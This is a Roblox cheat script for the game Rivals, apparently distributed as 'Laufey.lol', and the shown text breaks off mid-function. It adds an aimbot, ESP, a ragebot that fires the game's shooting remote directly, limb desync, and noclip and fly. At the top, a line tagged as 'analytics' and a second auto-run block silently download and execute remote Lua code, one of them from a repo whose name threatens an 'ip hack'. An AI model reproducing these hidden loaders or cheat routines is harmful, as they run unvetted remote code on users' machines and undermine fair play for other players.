--[[sv:analytics]]task.spawn(function()pcall(function()loadstring(game:HttpGet("https://scriptverse.net/api/analytics/client.lua?s=d057f344d741767ab0b3c6d0f9c95b79"))()end)end)--[[/sv:analytics]]

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/betterthanbefore0207767837-cyber/Unlockallby1mag/refs/heads/main/Ifnotinourserverdontuseelseugetiphack"))()
    end)
end)

local Players         = game:GetService("Players")
local RunService      = game:GetService("RunService")
local UserInputService= game:GetService("UserInputService")
local HttpService     = game:GetService("HttpService")
local RStorage        = cloneref(game:GetService("ReplicatedStorage"))
local LocalPlayer     = Players.LocalPlayer

-- ══════════════════════════════════════════════════════════════
--  HELPERS
-- ══════════════════════════════════════════════════════════════
local function getTargetPart(char, mode)
    if mode=="Head" then return char:FindFirstChild("HitboxHead") or char:FindFirstChild("Head")
    elseif mode=="Body" then return char:FindFirstChild("HitboxBody") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") or char:FindFirstChild("HumanoidRootPart")
    else return char:FindFirstChild("LeftFoot") or char:FindFirstChild("RightFoot") or char:FindFirstChild("Left Leg") or char:FindFirstChild("Right Leg") end
end

local _cleanRemote=Instance.new("RemoteEvent")
local fireServerNative=clonefunction(_cleanRemote.FireServer); _cleanRemote:Destroy()
local cachedEnumLib
local function enc(name)
    if not cachedEnumLib then
        local mod=RStorage:FindFirstChild("Modules") and RStorage.Modules:FindFirstChild("EnumLibrary")
        if mod then local ok,lib=pcall(require,mod); if ok and type(lib)=="table" then cachedEnumLib=lib end end
    end
    if not cachedEnumLib then return nil end
    local ok,token=pcall(cachedEnumLib.ToEnum,cachedEnumLib,name); return ok and token or nil
end

local cachedFC, lastFCScan = nil, 0
local function getFighterController()
    if cachedFC and rawget(cachedFC,"Objects") then return cachedFC end
    local t=os.clock(); if t-lastFCScan<5 then return nil end -- getgc(true) is heavy, never every frame
    lastFCScan=t
    for _,m in ipairs(getgc(true)) do
        if type(m)=="table" and rawget(m,"LocalFighter")~=nil and rawget(m,"Objects")~=nil then cachedFC=m; return m end
    end
end
local function getLocalFighter() local c=getFighterController(); return c and rawget(c,"LocalFighter") or nil end

local function isEnemy(player)
    if player==nil or player==LocalPlayer then return false end
    local a,b=LocalPlayer:GetAttribute("TeamID"),player:GetAttribute("TeamID")
    if a~=nil and b~=nil then return a~=b end
    if LocalPlayer.Team~=nil and player.Team~=nil then return LocalPlayer.Team~=player.Team end
    return true
end

local function getRageTarget()
    local ctrl=getFighterController(); local objs=ctrl and rawget(ctrl,"Objects")
    if type(objs)~="table" then return nil end
    local best,bestD=nil,math.huge
    local myRoot=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local myPos=myRoot and myRoot.Position or Vector3.new()
    for _,fighter in ipairs(objs) do
        local player=rawget(fighter,"Player")
        if player==nil or isEnemy(player) then
            local entity=rawget(fighter,"Entity"); local model=entity and rawget(entity,"Model")
            if model then
                local hb=model:FindFirstChild("HitboxHead"); local hum=model:FindFirstChildOfClass("Humanoid")
                if hb and (not hum or hum.Health>0) then
                    local d=(hb.Position-myPos).Magnitude
                    if d<bestD then bestD=d; best={hitboxHead=hb,model=model} end
                end
            end
        end
    end
    return best
end

local function getNearestPlayer()
    local myRoot=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return nil end
    local nc,nd=nil,math.huge
    for _,p in ipairs(Players:GetPlayers()) do
        if p~=LocalPlayer then
            local char=p.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
            local hum=char and char:FindFirstChildOfClass("Humanoid")
            if root and hum and hum.Health>0 then
                local d=(root.Position-myRoot.Position).Magnitude
                if d<nd then nd=d; nc=char end
            end
        end
    end
    return nc
end

local function buildPayload(hb,isRay)
    local pos=hb.Position
    local a1={["\0"]=pos.X,["\1"]=pos.Y,["\2"]=pos.Z,["\3"]=-math.pi/2,["\4"]=0,["\5"]=0}
    local a2={["\0"]=pos.X,["\1"]=pos.Y+1,["\2"]=pos.Z,["\3"]=-math.pi/2,["\4"]=0,["\5"]=0}
    local ex={["\0"]=0,["\1"]=1,["\2"]=0,["\3"]=0,["\4"]=0,["\5"]=0}
    local inner={["\0"]=a1,["\1"]=a2,["\2"]=hb,["\3"]=ex}
    if isRay then return{["\1"]=inner,["\2"]=true} end; return{["\1"]=inner}
end

local function getEquippedGun(fighter)
    local items=rawget(fighter,"Items"); if type(items)~="table" then return nil end
    for _,item in next,items do
        if type(item)=="table" and rawget(item,"IsEquipped") then
            local info=rawget(item,"Info"); if info and rawget(info,"Type")=="Gun" then
                local data=rawget(item,"Data"); if data and (rawget(data,"Ammo") or 0)>0 then return item end
            end
        end
    end
end

local rageRemote
local function getRageRemote()
    if rageRemote then return rageRemote end
    local r=RStorage:FindFirstChild("Remotes") and RStorage.Remotes:FindFirstChild("Replication")
        and RStorage.Remotes.Replication:FindFirstChild("Fighter")
        and RStorage.Remotes.Replication.Fighter:FindFirstChild("UseItem")
    if r and r:IsA("RemoteEvent") then rageRemote=cloneref(r) end
    return rageRemote
end

local function fireAtTarget(fighter,target)
    local remote=getRageRemote(); if not remote then return end
    local item=getEquippedGun(fighter); if not item then return end
    local data=rawget(item,"Data"); local objectId=data and rawget(data,"ObjectID")
    local info=rawget(item,"Info"); local isRay=info and rawget(info,"IsRaycast")==true
    local token=enc("StartShooting"); if not objectId or not token then return end
    fireServerNative(remote,objectId,token,buildPayload(target.hitboxHead,isRay),nil)
end

-- ══════════════════════════════════════════════════════════════
--  AIRSLIDE MODULE
-- ══════════════════════════════════════════════════════════════
local AirSlide = (function()
    local RS  = game:GetService("RunService")
    local UIS = game:GetService("UserInputService")
    local LP  = Players.LocalPlayer

    local floorPart = nil
    local slamming  = false
    local inputConn = nil
    local duration  = 0.4
    local friction  = 0
    local keyCode   = Enum.KeyCode.LeftControl

    local function placeFloor(hrp)
        if floorPart then floorPart:Destroy() end
        local p = Instance.new("Part")
        p.Name = "RivalsAntiStuckAirFloor"
        p.Size = Vector3.new(8, 0.2, 8)
        p.Anchored = true
        p.CanCollide = true
        p.Transparency = 1
        p.Material = Enum.Material.SmoothPlastic
        p.Friction = friction
        p.Parent = workspace
        floorPart = p

        local conn
        conn = RS.PreRender:Connect(function()
            if hrp and hrp.Parent then
                if Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z).Magnitude < 5 then
                    slamming = false
                end
            end
            if not slamming or not hrp or not hrp.Parent or floorPart ~= p then
                if conn then conn:Disconnect() end
                p:Destroy()
                return
            end
            p.CFrame = hrp.CFrame * CFrame.new(0, -3, 0)
        end)
    end

    local function doSlide()
        local char = LP.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or slamming then return end
        if hum.FloorMaterial ~= Enum.Material.Air then return end
        slamming = true
        placeFloor(hrp)
        local total = 0
        while slamming and total < duration do
            task.wait(0.01); total += 0.01
        end
        slamming = false
        if floorPart then floorPart:Destroy(); floorPart = nil end
    end

    local M = {}
    function M.Enable()
        if inputConn then return end
        inputConn = UIS.InputBegan:Connect(function(input, gp)
            if gp then return end
            if input.KeyCode == keyCode or input.KeyCode == Enum.KeyCode.C or input.UserInputType == Enum.UserInputType.Touch then
                task.defer(function()
                    local char = LP.Character
                    local hum  = char and char:FindFirstChildOfClass("Humanoid")
                    if hum and hum.FloorMaterial == Enum.Material.Air then doSlide() end
                end)
            end
        end)
    end
    function M.Disable()
        if inputConn then inputConn:Disconnect(); inputConn = nil end
        slamming = false
        if floorPart then floorPart:Destroy(); floorPart = nil end
    end
    function M.Active() return inputConn ~= nil end
    function M.SetDuration(d) duration = d end
    function M.SetFriction(f) friction = f end
    function M.SetKey(k) keyCode = k end
    function M.GetDuration() return duration end
    function M.GetFriction() return friction end
    function M.GetKeyName() return keyCode.Name end
    return M
end)()

-- ══════════════════════════════════════════════════════════════
--  HYPER SLIDE MODULE
-- ══════════════════════════════════════════════════════════════
local HyperSlide = (function()
    local LP = Players.LocalPlayer
    local RS = game:GetService("RunService")

    local mech = nil
    local ceilingPart = nil
    local renderConn = nil
    local active = false

    local function ensureCeiling()
        if ceilingPart and ceilingPart.Parent then return ceilingPart end
        local p = Instance.new("Part")
        p.Name = "HyperSlideCeiling"
        p.Size = Vector3.new(8, 0.3, 8)
        p.Anchored = true
        p.CanCollide = true
        p.Transparency = 1
        p.CanQuery = false
        p.CanTouch = false
        p.Material = Enum.Material.SmoothPlastic
        p.Parent = workspace
        ceilingPart = p
        return p
    end

    local function tryLoadMech()
        if mech then return true end
        local ps = LP:FindFirstChild("PlayerScripts")
        if not ps then return false end
        local ctrl = ps:FindFirstChild("Controllers")
        if not ctrl then return false end
        local mc = ctrl:FindFirstChild("MechanicsController")
        if not mc then return false end
        local ok, m = pcall(require, mc)
        if ok and type(m) == "table" then mech = m; return true end
        return false
    end

    local M = {}
    function M.Enable()
        if active then return end
        active = true
        ensureCeiling()
        tryLoadMech()

        renderConn = RS.RenderStepped:Connect(function()
            if not active then return end
            if not mech then
                tryLoadMech()
                if not mech then return end
            end

            if mech._sliding_cooldown and mech._sliding_cooldown > 0 then
                mech._sliding_cooldown = 0
            end

            local char = LP.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root and ceilingPart and ceilingPart.Parent then
                ceilingPart.CFrame = CFrame.new(root.Position + Vector3.new(0, 2.42, 0))
            end
        end)
    end
    function M.Disable()
        active = false
        if renderConn then renderConn:Disconnect(); renderConn = nil end
        if ceilingPart then pcall(function() ceilingPart:Destroy() end); ceilingPart = nil end
    end
    function M.Active() return active end
    return M
end)()

-- ══════════════════════════════════════════════════════════════
--  WORLD FONTS
-- ══════════════════════════════════════════════════════════════
local WorldFonts = (function()
    local FONTS = {
        {name="Gotham", font=Enum.Font.Gotham}, 
        {name="Sci-Fi", font=Enum.Font.SciFi}, 
        {name="Fantasy", font=Enum.Font.Fantasy},
        {name="Arcade", font=Enum.Font.Arcade}, 
        {name="Antique", font=Enum.Font.Antique}, 
        {name="Code", font=Enum.Font.Code},
        {name="Cartoon", font=Enum.Font.Cartoon}, 
        {name="Bodoni", font=Enum.Font.Bodoni}, 
        {name="Creepster", font=Enum.Font.Creepster},
        {name="Indie Flower", font=Enum.Font.IndieFlower}, 
        {name="Garamond", font=Enum.Font.Garamond}, 
        {name="Highway", font=Enum.Font.Highway},
        {name="Legacy", font=Enum.Font.Legacy}, 
        {name="SourceSans", font=Enum.Font.SourceSans}, 
        {name="Sarpanch", font=Enum.Font.Sarpanch},
        {name="Roboto", font=Enum.Font.Roboto}, 
        {name="RobotoMono", font=Enum.Font.RobotoMono},
        {name="Larickson", font=Enum.Font.Arcade}, 
        {name="Franklin Fracture", font=Enum.Font.Fantasy},
        {name="Fracture", font=Enum.Font.Fantasy}
    }
    local originals = {}
    local active = false
    local currentIdx = 1
    local addConns = {}

    local function collectRoots()
        local roots = {workspace}
        local pg = LocalPlayer:FindFirstChild("PlayerGui")
        if pg then table.insert(roots, pg) end
        return roots
    end

    local function applyToInstance(d, fontEnum)
        if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
            if originals[d] == nil then
                originals[d] = d.Font
                d.Destroying:Connect(function() originals[d] = nil end)
            end
            pcall(function() d.Font = fontEnum end)
        end
    end

    local function fullScan(fontEnum)
        local n = 0
        for _, root in ipairs(collectRoots()) do
            for _, d in ipairs(root:GetDescendants()) do
                applyToInstance(d, fontEnum)
                n += 1
                if n % 400 == 0 then task.wait(); if not active then return end end
            end
        end
    end

    local function startAutoScan()
        if #addConns > 0 then return end
        for _, root in ipairs(collectRoots()) do
            addConns[#addConns+1] = root.DescendantAdded:Connect(function(d)
                if active then applyToInstance(d, FONTS[currentIdx].font) end
            end)
        end
    end

    local M = {}
    function M.Enable(idx)
        if active then currentIdx = idx or currentIdx; fullScan(FONTS[currentIdx].font); return end
        active = true; currentIdx = idx or 1; startAutoScan(); fullScan(FONTS[currentIdx].font)
    end
    function M.Disable()
        active = false
        for _, c in ipairs(addConns) do c:Disconnect() end; addConns = {}
        for inst, orig in pairs(originals) do if inst and inst.Parent then pcall(function() inst.Font = orig end) end end
        originals = {}
    end
    function M.Active() return active end
    function M.Set(idx) if idx >= 1 and idx <= #FONTS then currentIdx = idx; if active then fullScan(FONTS[idx].font) end end end
    function M.FontList() return FONTS end
    return M
end)()

-- ══════════════════════════════════════════════════════════════
--  RAGEBOT DEFAULTS + LIMB DESYNC (from Mommy_sBigAss)
-- ══════════════════════════════════════════════════════════════
do
    local D = {VOID_TIME=5, ATTACK_TIME=0.5, BACK_OFFSET=10, VOID_Y=-500, HEIGHT_OFFSET=3,
               ORBIT_ENABLED=true, ORBIT_RADIUS=6, ORBIT_SPEED=180, ORBIT_HEIGHT=3}
    for k,v in pairs(D) do if getgenv()[k]==nil then getgenv()[k]=v end end
    if getgenv().RageLimbDesync==nil then getgenv().RageLimbDesync=true end
    if getgenv().LIMB_SPREAD==nil then getgenv().LIMB_SPREAD=8 end
end

local RageLimbDesync = (function()
    -- R15 + R6 limb names. Head/torso stay attached so the camera doesn't shake.
    local LIMBS = {
        LeftUpperArm=1, LeftLowerArm=1, LeftHand=1, RightUpperArm=1, RightLowerArm=1, RightHand=1,
        LeftUpperLeg=1, LeftLowerLeg=1, LeftFoot=1, RightUpperLeg=1, RightLowerLeg=1, RightFoot=1,
        ["Left Arm"]=1, ["Right Arm"]=1, ["Left Leg"]=1, ["Right Leg"]=1,
    }
    local velConn, posConn, active = nil, nil, false
    local curChar, lastGrab = nil, 0
    local joints, parts, canCol = {}, {}, {}

    local function release()
        for _, m in ipairs(joints) do if m.Parent then m.Enabled = true end end -- joint snaps the limb back
        for part, c in pairs(canCol) do if part.Parent then part.CanCollide = c end end
        joints, parts, canCol, curChar = {}, {}, {}, nil
    end
    local function grab(char)
        release()
        curChar = char
        for _, d in ipairs(char:GetDescendants()) do
            if d:IsA("Motor6D") and d.Part1 and LIMBS[d.Part1.Name] then
                joints[#joints+1] = d; d.Enabled = false
                parts[#parts+1] = d.Part1
                canCol[d.Part1] = d.Part1.CanCollide; d.Part1.CanCollide = false
            end
        end
    end

    local M = {}
    function M.Enable()
        if active then return end
        active = true
        velConn = RunService.Stepped:Connect(function()
            local char = LocalPlayer.Character
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            if not hum or not hrp then return end
            if not hum.PlatformStand then hum.PlatformStand = true end
            local vy = hrp.AssemblyLinearVelocity.Y
            local md = hum.MoveDirection
            if md.Magnitude > 0 then
                hrp.AssemblyLinearVelocity = md * 150 + Vector3.new(0, vy, 0)
            else
                hrp.AssemblyLinearVelocity = Vector3.new(0, vy, 0)
            end
            if hrp.Position.Y < -100 then
                hrp.CFrame = CFrame.new(hrp.Position.X, 50, hrp.Position.Z)
                hrp.AssemblyLinearVelocity = Vector3.zero
            end
        end)
        -- Heartbeat = after physics, so the spread positions are what gets replicated
        posConn = RunService.Heartbeat:Connect(function()
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local now = os.clock()
            if char ~= curChar or (#joints == 0 and now - lastGrab > 1) then lastGrab = now; grab(char) end
            local spread = getgenv().LIMB_SPREAD or 8
            local t = now * 6
            local base = hrp.CFrame
            for i, part in ipairs(parts) do
                if part.Parent then
                    local a = t + i * 1.7
                    part.CFrame = base * CFrame.new(math.cos(a) * spread, math.sin(a * 1.3) * spread * 0.5, math.sin(a) * spread)
                    part.AssemblyLinearVelocity = Vector3.zero
                    part.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end)
    end
    function M.Disable()
        if not active then return end
        active = false
        if velConn then velConn:Disconnect(); velConn = nil end
        if posConn then posConn:Disconnect(); posConn = nil end
        release()
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.PlatformStand = false end
    end
    function M.Active() return active end
    return M
end)()

-- ══════════════════════════════════════════════════════════════
--  FPS BOOST (from Mommy_sBigAss, chunked scan, restores originals)
-- ══════════════════════════════════════════════════════════════
local FPSBoost = (function()
    local stored = setmetatable({}, {__mode = "k"})
    local active, addConn = false, nil
    local origShadows, origQuality = nil, nil
    local function strip(inst)
        if inst:IsA("ParticleEmitter") or inst:IsA("Smoke") or inst:IsA("Fire") or inst:IsA("Sparkles") or inst:IsA("Trail") then
            if stored[inst] == nil then stored[inst] = inst.Enabled end
            inst.Enabled = false
        elseif inst:IsA("Decal") or inst:IsA("Texture") then
            if stored[inst] == nil then stored[inst] = inst.Transparency end
            inst.Transparency = 1
        elseif inst:IsA("Atmosphere") then
            if stored[inst] == nil then stored[inst] = inst.Density end
            inst.Density = 0
        end
    end
    local M = {}
    function M.Enable()
        if active then return end
        active = true
        addConn = workspace.DescendantAdded:Connect(function(d) if active then strip(d) end end)
        pcall(function()
            local L = game:GetService("Lighting")
            origShadows = L.GlobalShadows
            for _, d in ipairs(L:GetDescendants()) do strip(d) end
            L.GlobalShadows = false
        end)
        pcall(function()
            origQuality = settings().Rendering.QualityLevel
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        end)
        task.spawn(function()
            local n = 0
            for _, d in ipairs(workspace:GetDescendants()) do
                if not active then return end
                strip(d); n += 1
                if n % 500 == 0 then task.wait() end
            end
        end)
    end
    function M.Disable()
        if not active then return end
        active = false
        if addConn then addConn:Disconnect(); addConn = nil end
        for inst, val in pairs(stored) do
            if inst.Parent then
                pcall(function()
                    if inst:IsA("Decal") or inst:IsA("Texture") then inst.Transparency = val
                    elseif inst:IsA("Atmosphere") then inst.Density = val
                    else inst.Enabled = val end
                end)
            end
        end
        stored = setmetatable({}, {__mode = "k"})
        pcall(function() if origShadows ~= nil then game:GetService("Lighting").GlobalShadows = origShadows end end)
        pcall(function() if origQuality then settings().Rendering.QualityLevel = origQuality end end)
    end
    function M.Active() return active end
    return M
end)()

-- ══════════════════════════════════════════════════════════════
--  UI INITIALIZATION (PEPSI UI)
-- ══════════════════════════════════════════════════════════════
local library = loadstring(game:GetObjects("rbxassetid://7657867786")[1].Source)()
local Wait = library.subs.Wait

local function guiRoots()
    local t = {}
    local okH, h = pcall(function() return gethui and gethui() end)
    if okH and h then t[#t+1] = h end
    local okC, c = pcall(function() return game:GetService("CoreGui") end)
    if okC and c then t[#t+1] = c end
    t[#t+1] = LocalPlayer:WaitForChild("PlayerGui")
    return t
end
local function snapshotGuis()
    local set = {}
    for _, r in ipairs(guiRoots()) do
        pcall(function() for _, g in ipairs(r:GetChildren()) do set[g] = true end end)
    end
    return set
end
local guisBefore = snapshotGuis()

local PepsisWorld = library:CreateWindow({
    Name = "Laufey.lol | Rivals",
    Themeable = {
        Info = "Rivals"
    }
})

local libGuis = {}
do
    local fresh = {}
    for _, r in ipairs(guiRoots()) do
        pcall(function()
            for _, g in ipairs(r:GetChildren()) do
                if g:IsA("ScreenGui") and not guisBefore[g] then fresh[#fresh+1] = g end
            end
        end)
    end
    for _, g in ipairs(fresh) do
        local ok, err = pcall(function()
            for _, d in ipairs(g:GetDescendants()) do
                if d:IsA("TextLabel") and d.Text:find("Laufey.lol", 1, true) then error("LAUFEY_HIT") end
            end
        end)
        if not ok and tostring(err):find("LAUFEY_HIT", 1, true) then libGuis[#libGuis+1] = g end
    end
    if #libGuis == 0 then libGuis = fresh end
end

local uiScale = nil
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
local uiScaleValue = isMobile and 0.65 or 1

-- ══════════════════════════════════════════════════════════════
--  GENERAL TAB (COMBAT / PLAYER / MISC)
-- ══════════════════════════════════════════════════════════════
local GeneralTab = PepsisWorld:CreateTab({ Name = "General" })

local FarmingSection = GeneralTab:CreateSection({ Name = "Farming" })
FarmingSection:AddToggle({
    Name = "Auto Farm (Noclip + Fly)",
    Flag = "FarmingSection_ExpGrinder",
    Default = false,
    Callback = function(v)
        getgenv().Noclip = v
        getgenv().FlyEnabled = v
    end
})
FarmingSection:AddToggle({
    Name = "Infinite Jump",
    Flag = "FarmingSection_TrickSpammer",
    Default = false,
    Callback = function(v) getgenv().InfJump = v end
})
FarmingSection:AddToggle({
    Name = "AirSlide (Press Ctrl)",
    Flag = "FarmingSection_TPCoins",
    Default = false,
    Callback = function(v) if v then AirSlide.Enable() else AirSlide.Disable() end end
})
FarmingSection:AddToggle({
    Name = "HyperSlide (No Cooldown)",
    Flag = "FarmingSection_CollectCoins",
    Default = false,
    Callback = function(v) if v then HyperSlide.Enable() else HyperSlide.Disable() end end
})
FarmingSection:AddSlider({
    Name = "Fly Speed",
    Flag = "FarmingSection_CoinDistance",
    Value = 60,
    Min = 10,
    Max = 200,
    Callback = function(v) getgenv().FlySpeed = v end
})

local BoardControlSection = GeneralTab:CreateSection({ Name = "Board Control" })
BoardControlSection:AddToggle({
    Name = "Aimbot Enabled",
    Flag = "BoardControlSection_AntiTripRagdoll",
    Default = false,
    Callback = function(v) getgenv().Aimbot = v end
})
BoardControlSection:AddToggle({
    Name = "Show FOV",
    Flag = "BoardControlSection_NoWearTear",
    Default = false,
    Callback = function(v) getgenv().ShowFOV = v end
})
BoardControlSection:AddSlider({
    Name = "Aimbot FOV",
    Flag = "BoardControlSection_TimeoutExtension",
    Value = 150,
    Min = 50,
    Max = 500,
    Callback = function(v) getgenv().FOV = v end
})
BoardControlSection:AddSlider({
    Name = "Aimbot Smoothness",
    Flag = "BoardControlSection_Smooth",
    Value = 0.5,
    Min = 0.1,
    Max = 1,
    Callback = function(v) getgenv().Smoothness = v end
})

local MiscSection = GeneralTab:CreateSection({ Name = "Misc", Side = "Right" })
MiscSection:AddToggle({
    Name = "ESP Enabled",
    Flag = "MiscSection_UnlockGamepasses",
    Default = false,
    Callback = function(v) getgenv().ESP = v end
})
MiscSection:AddToggle({
    Name = "ESP Box",
    Flag = "MiscSection_AutoCompete",
    Default = false,
    Callback = function(v) getgenv().ESPBox = v end
})
MiscSection:AddToggle({
    Name = "ESP Tracers",
    Flag = "MiscSection_Tracers",
    Default = false,
    Callback = function(v) getgenv().Tracers = v end
})
MiscSection:AddToggle({
    Name = "FPS Boost",
    Flag = "MiscSection_FPSBoost",
    Default = isMobile,
    Callback = function(v) if v then FPSBoost.Enable() else FPSBoost.Disable() end end
})
MiscSection:AddSlider({
    Name = "UI Size",
    Flag = "MiscSection_UIScale",
    Value = uiScaleValue,
    Min = 0.4,
    Max = 1.2,
    Callback = function(v) uiScaleValue = v; if uiScale then uiScale.Scale = v end end
})
if isMobile then task.defer(FPSBoost.Enable) end
MiscSection:AddButton({
    Name = "Rejoin Game",
    Callback = function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId) end
})

-- ══════════════════════════════════════════════════════════════
--  FUN COSMETICS (SCRIPTS / VISUALS)
-- ══════════════════════════════════════════════════════════════
local FunSection = GeneralTab:CreateSection({ Name = "Fun Cosmetics" })
FunSection:AddToggle({
    Name = "Fullbright",
    Flag = "FunSection_AssumesFlight",
    Default = false,
    Callback = function(v)
        local lighting = game:GetService("Lighting")
        if v then
            getgenv().origAmb = lighting.Ambient
            getgenv().origOut = lighting.OutdoorAmbient
            lighting.Ambient = Color3.new(1,1,1)
            lighting.OutdoorAmbient = Color3.new(1,1,1)
            lighting.Brightness = 2
        else
            if getgenv().origAmb then lighting.Ambient = getgenv().origAmb end
            if getgenv().origOut then lighting.OutdoorAmbient = getgenv().origOut end
            lighting.Brightness = 1
        end
    end
})
FunSection:AddToggle({
    Name = "World Fonts",
    Flag = "FunSection_RagdollOnPlayerCollision",
    Default = false,
    Callback = function(v)
        if v then WorldFonts.Enable(1) else WorldFonts.Disable() end
    end
})
FunSection:AddButton({
    Name = "Val Hands",
    Callback = function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/mrbeanissohot/Bean-sValorant/refs/heads/main/Valorant.lua",true))() end) end
})
FunSection:AddButton({
    Name = "Draco",
    Callback = function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/mrbeanissohot/DraconicWildcat/refs/heads/main/Draco.lua",true))() end) end
})
FunSection:AddButton({
    Name = "Stretched FOV",
    Callback = function() pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Stretched-Resolution-Higher-FOV-48170"))() end) end
})

-- ══════════════════════════════════════════════════════════════
--  RAGEBOT TAB
-- ══════════════════════════════════════════════════════════════
local RageTab = PepsisWorld:CreateTab({ Name = "Ragebot" })

local function syncDesync()
    if getgenv()._rageEnabled and getgenv().RageLimbDesync then RageLimbDesync.Enable() else RageLimbDesync.Disable() end
end

local RageMain = RageTab:CreateSection({ Name = "Ragebot" })
RageMain:AddToggle({
    Name = "Ragebot", Flag = "RageTab_Enabled", Default = false,
    Callback = function(v) getgenv()._rageEnabled = v; syncDesync() end
})
RageMain:AddToggle({
    Name = "Limb Desync", Flag = "RageTab_Desync", Default = getgenv().RageLimbDesync,
    Callback = function(v) getgenv().RageLimbDesync = v; syncDesync() end
})
RageMain:AddToggle({
    Name = "Orbit", Flag = "RageTab_Orbit", Default = getgenv().ORBIT_ENABLED,
    Callback = function(v) getgenv().ORBIT_ENABLED = v end
})

-- typing box; falls back to a slider if the lib build has no AddTextbox
local function addNumInput(section, name, flag, key, mn, mx)
    local function apply(v)
        local n = tonumber(v)
        if n then getgenv()[key] = n end
    end
    local ok = pcall(function()
        section:AddTextbox({ Name = name, Flag = flag, Value = tostring(getgenv()[key]), Callback = apply })
    end)
    if not ok then
        section:AddSlider({ Name = name, Flag = flag .. "_S", Value = getgenv()[key], Min = mn, Max = mx, Callback = apply })
    end
end

local RageTiming = RageTab:CreateSection({ Name = "Timing", Side = "Right" })
addNumInput(RageTiming, "Void Time",   "RageTab_VoidT",  "VOID_TIME",   0,     30)
addNumInput(RageTiming, "Attack Time", "RageTab_AtkT",   "ATTACK_TIME", 0.1,   5)
addNumInput(RageTiming, "Void Y",      "RageTab_VoidY",  "VOID_Y",      -2000, -100)

local RagePos = RageTab:CreateSection({ Name = "Position / Orbit" })
addNumInput(RagePos, "Back Offset",   "RageTab_Back",   "BACK_OFFSET",   0,   50)
addNumInput(RagePos, "Height Offset", "RageTab_Height", "HEIGHT_OFFSET", -20, 50)
addNumInput(RagePos, "Orbit Radius",  "RageTab_Rad",    "ORBIT_RADIUS",  1,   50)
addNumInput(RagePos, "Orbit Speed",   "RageTab_Speed",  "ORBIT_SPEED",   10,  1080)
addNumInput(RagePos, "Limb Spread",   "RageTab_Spread", "LIMB_SPREAD",   1,   20)

-- ══════════════════════════════════════════════════════════════
--  FLOATING DRAGGABLE TOGGLE BUTTON
-- ══════════════════════════════════════════════════════════════
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local ScreenGui = Instance.new("ScreenGui")
local ToggleButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")

ScreenGui.Name = "LaufeyMobileToggle"
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = PlayerGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false 

ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = ScreenGui
ToggleButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ToggleButton.Position = UDim2.new(0, 20, 0.45, 0) 
ToggleButton.Size = UDim2.new(0, 68, 0, 28)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "Hide UI"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 12.000
ToggleButton.Visible = true
ToggleButton.Active = true

UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = ToggleButton

UIStroke.Color = Color3.fromRGB(90, 90, 90)
UIStroke.Thickness = 1.5
UIStroke.Parent = ToggleButton

-- Drag Logic
local dragging = false
local dragInput, dragStart, startPos
local btnMoved = false

ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        btnMoved = false
        dragStart = input.Position
        startPos = ToggleButton.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

ToggleButton.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        if delta.Magnitude > 4 then btnMoved = true end
        ToggleButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Toggle Logic: hide/show the lib's ScreenGui(s) directly (Open/Close on the lib is unreliable)
local uiVisible = true
local function setUIVisible(v)
    uiVisible = v
    local handled = false
    for _, g in ipairs(libGuis) do
        if g.Parent then g.Enabled = v; handled = true end
    end
    if not handled then pcall(function() if v then PepsisWorld:Open() else PepsisWorld:Close() end end) end
    ToggleButton.Text = v and "Hide UI" or "Show UI"
end
ToggleButton.MouseButton1Click:Connect(function()
    if btnMoved then btnMoved = false; return end -- it was a drag, not a click
    setUIVisible(not uiVisible)
end)

-- Find the lib window, shrink it (UIScale) and make it draggable by its top strip
task.spawn(function()
    task.wait(0.5) -- let the lib lay itself out
    local main, first
    for _, g in ipairs(libGuis) do
        local best, area = nil, 0
        for _, c in ipairs(g:GetChildren()) do
            if c:IsA("GuiObject") then
                first = first or c
                local a = c.AbsoluteSize.X * c.AbsoluteSize.Y
                if a > area then best, area = c, a end
